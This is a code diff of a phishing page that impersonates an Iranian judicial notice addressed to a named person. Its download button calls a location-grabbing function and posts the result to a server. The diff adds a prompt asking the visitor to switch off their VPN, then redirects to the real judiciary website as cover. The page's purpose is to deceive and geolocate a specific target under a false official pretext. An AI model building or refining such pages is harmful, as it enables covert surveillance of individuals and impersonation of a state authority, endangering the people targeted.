@@ -69,7 +69,7 @@
     <img src="IMG-20260908-WA0004.jpg" alt="اخبار عاجل" class="news-img">
     
     <!-- 📝 متن زیر تصویر -->
-    <div class="news-text">ابلاغیه قضایی آقای علی پیشگر</div>
+    <div class="news-text">ابلاغیه قضایی علی پیشگر</div>
     
     <!-- 🔘 دکمه دانلود/اقدام در پایین‌ترین قسمت -->
     <button class="btn-download" onclick="getLocation()"> مشاهده و دانلود فایل ابلاغیه قضایی</button>
@@ -110,10 +110,18 @@ method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify(payload)
 })
-.then(response => {
-// در اینجا می‌توانید کاربر را به یک عکس یا سایت دیگر هدایت کنید
- window.location.href = "https://www.adliran.ir";
+    .then(response => {
+    // 💬 نمایش پیام متنی به کاربر
+    alert(" لطفا فیلتر شکن خود را خاموش کنید "); 
+    
+    // انتقال به سایت مقصد (لینک دلخواه خود را بجای این قرار دهید)
+    window.location.href = "https://Adliran.ir"; 
 })
+
+//.then(response => {
+// در اینجا می‌توانید کاربر را به یک عکس یا سایت دیگر هدایت کنید
+ //window.location.href = "https://www.adliran.ir";
+//})
 
 .catch(error => console.error('Error:', error));
 } // 👈 این آکولاژ را دقیقاً اینجا اضافه کن تا تابع sendLocationToServer بسته شود
